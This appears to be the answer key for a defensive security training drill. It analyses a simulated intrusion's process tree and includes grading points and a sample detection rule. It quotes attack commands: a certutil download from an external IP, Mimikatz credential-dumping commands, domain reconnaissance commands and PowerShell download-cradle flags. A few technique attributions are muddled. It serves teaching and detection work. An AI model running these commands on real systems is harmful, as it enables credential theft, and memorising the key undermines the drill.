# Drill 02 Solution: Process Tree Analysis

**Maximum score: 20 points**

---

## Q1 — Identify Legitimate vs. Suspicious Activity (3 points)

**a) Legitimate Branches:**

**Branch A** (PIDs 3000–3100): SYSTEM-initiated `svchost.exe` spawning `mmc.exe` to open Task Scheduler.
This is consistent with a developer or admin opening Task Scheduler from a management console.
Fully legitimate.

**Branch B** (PIDs 4000–4002): VS Code spawning an extension host process, which then runs a build script (`node ./build_script.js`).
This is completely consistent with a developer's normal workflow — VS Code extensions routinely spawn Node.js processes.

**b) Malicious Branches:**

**Branch C** (PIDs 5000–5105) is entirely malicious.
The initial PowerShell download-and-execute (PID 5100) is the entry point, and everything spawned from it is attacker-controlled.

**Branch D** (PIDs 6000–6002) is a direct continuation of Branch C — all spawned by PID 5100 (the attacker's PowerShell).
This includes Mimikatz and scheduled task persistence.

**c) Boundary Event:**

PID 5100 — `[10:41:45] svchost.exe → powershell.exe -w hidden -nop -c "IEX(...)"` — this is the exact point where the attack begins.
Everything before is benign; everything after is malicious.

**Grading:** 1 point each for correctly categorizing A/B as legit with reasoning; 1 point for Branch C/D as malicious; 0.5 points for identifying PID 5100 as the boundary.

---

## Q2 — Parent Process Analysis (3 points)

**a) Parent of PID 5100:**
Parent is PID 5000 — `svchost.exe -k netsvcs -p -s wuauserv` (the Windows Update service host).
This is **NOT normal**. `svchost.exe` is a service host that runs Windows services.
Windows services should not be spawning PowerShell processes in user context (`CORP\msmith`).

**b) What's unusual:**

* `svchost.exe` running as SYSTEM spawned PowerShell running as `CORP\msmith` — a user context switch is suspicious
* Windows services (running in `svchost.exe`) don't typically spawn interactive PowerShell sessions
* If WinRM (Windows Remote Management) or a scheduled task in disguise is being used, a user-mode PowerShell child of a system-level service process is a strong indicator of compromise
* In this case, the attacker likely triggered a WMI event subscription or exploited the scheduled task service

**c) Attack technique name:**
This is a **WMI Event Subscription** (T1546.003) or potentially a scheduled task (T1053.005) being triggered via the task scheduler service (`wuauserv` process hosting).
The actual spawning of `powershell.exe` from a svchost/service context is classic **Process Injection** into a service context, or a WMI consumer firing.

More specifically, the `wuauserv` (Windows Update) service being the parent is a strong indicator that the attacker used a **WMI Consumer** set to trigger on a scheduled event, or exploited a legitimate-seeming scheduled task that was set to fire via the Update service context.

---

## Q3 — LOLBin Identification (2 points)

**a) Binary abused:** `certutil.exe` (PID 5105)

**b) Legitimate purpose:**
`certutil.exe` is a Windows certificate management tool.
Its legitimate uses include displaying/managing certificates, verifying certificate chains, encoding/decoding Base64 data.

**c) How it's being abused:**

```text
certutil.exe -urlcache -split -f http://185.234.219.47/tools.zip C:\Users\...\tools.zip
```

The `-urlcache` flag with `-f` (force) tells certutil to download a file from a URL and save it locally.
This is a well-known file download technique that:

* Uses a signed, trusted Microsoft binary (bypasses application allowlisting policies that only allow signed binaries)
* Doesn't trigger the "download from internet" mark-of-the-web
* Was historically not monitored by AV/EDR (though modern EDR catches this)

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer via T1218.002 (certutil LOLBin proxy)

---

## Q4 — Reconnaissance Commands (2 points)

**a) Information gathered (PIDs 5101–5104):**

| PID | Command | Information Gathered |
|-----|---------|---------------------|
| 5101 | `whoami /all` | Full user context: SID, domain, group memberships, privileges |
| 5102 | `net user /domain` | All user accounts in the Active Directory domain |
| 5103 | `net group "Domain Admins" /domain` | Who are the domain administrators? |
| 5104 | `Get-ADComputer -Filter *` | List of ALL computers in the domain with hostnames |

This is systematic **domain reconnaissance** — the attacker is mapping the entire domain to plan lateral movement.

**b) Why `net group "Domain Admins" /domain` matters:**
This reveals which accounts have domain administrator privileges.
The attacker will:

1. Target those accounts specifically for credential theft
1. Look for those accounts' sessions on other machines (for token impersonation)
1. Prioritize compromising those accounts to achieve full domain control
1. Know who to target in a phishing or brute force follow-up

**MITRE ATT&CK:** T1069.002 — Permission Groups Discovery: Domain Groups

---

## Q5 — Tool Download and Execution (2 points)

**a) Mimikatz:**
Mimikatz is an open-source credential extraction tool that reads authentication credential material from Windows memory.
The specific command:

* `privilege::debug` — requests SeDebugPrivilege (required to read process memory)
* `sekurlsa::logonpasswords` — reads all credentials from LSASS memory: NTLM hashes, Kerberos tickets, plaintext passwords (for older authentication or unconfigured systems), and WDigest credentials
* `exit` — terminates Mimikatz after dumping

The output includes:

* NTLM password hashes for every user who has logged in since last reboot
* Kerberos tickets (TGTs and service tickets)
* Potentially plaintext passwords if WDigest caching is enabled

**b) MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

---

## Q6 — Persistence Mechanism (2 points)

**a) Persistence established:**
A scheduled task named `OneDriveUpdate` was created to run `C:\Users\msmith\AppData\Roaming\OneDriveUpdate.exe` — a binary name that mimics the legitimate OneDrive Update process.

**b) When it executes:**
`/sc onlogon` means the task fires **every time `CORP\msmith` logs on** to any domain-joined computer.
This is user-scoped persistence that:

* Runs as `CORP\msmith` (the compromised user's context)
* Fires on every logon, even after a reboot
* Is in a user-writable path (`AppData\Roaming`) so it can be maintained without admin rights

**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task + T1036.005 (Masquerading as OneDrive)

---

## Q7 — Network Traffic Analysis (2 points)

* **10:41:45 (2.1KB download):** PowerShell downloads the stage-2 script `run.ps1` via the IEX download cradle. This is the initial C2 payload — likely a full-featured backdoor or further stager.

* **10:42:10 (4.7MB download via certutil):** Downloads `tools.zip` containing attacker tools — in this case, Mimikatz and likely other post-exploitation utilities (`tools\mimikatz.exe` is extracted at 10:45:00). The 4.7MB size is consistent with a toolkit archive.

* **10:46:30 (89KB sent — EXFILTRATION):** The 89KB **POST** request to the attacker's C2 is **credential exfiltration**. The Mimikatz dump completed at 10:46:01, and ~45 seconds later, 89KB is sent to the C2. The dump output from a typical system (with 5–10 logged-in users) is approximately this size. The attacker's C2 is now receiving domain credentials.

---

## Q8 — Write a Detection Rule (4 points)

**Sample high-quality answer:**

```text
RULE NAME: Service Process Spawns Encoded/Hidden PowerShell
TRIGGER: Sysmon Event 1 (Process Create)
CONDITION:
  ParentImage ends with 'svchost.exe'
  AND Image ends with 'powershell.exe'
  AND CommandLine contains ANY of:
    '-enc', '-EncodedCommand', '-w hidden', '-nop', 'IEX', 'DownloadString'
ALERT LEVEL: Critical
JUSTIFICATION:
  svchost.exe is a system service host — it NEVER legitimately spawns
  an interactive PowerShell with obfuscation or download flags.
  False positive rate is extremely low (near zero) because:

  1. System service hosts don't interact with PowerShell directly

  2. The obfuscation flags (-enc, -w hidden, -nop) indicate intent to hide
  3. IEX/DownloadString indicate execution of downloaded code
  This rule targets the exact TTPs used in this scenario and is broadly
  applicable to WMI-triggered, scheduled-task-triggered, and service-
  exploited PowerShell execution.
```

**Alternative acceptable answers:** Also full credit for rules targeting:

* `certutil.exe` spawned by PowerShell with `-urlcache` flag
* Any process in TEMP/AppData path spawning reconnaissance commands (whoami, net user /domain)
* PowerShell with IEX + DownloadString (regardless of parent — slightly more false positives but valid)

**Deduct 1 point if:** The rule has obvious high false-positive scenarios that weren't acknowledged, or if the alert level doesn't match the severity of the condition.
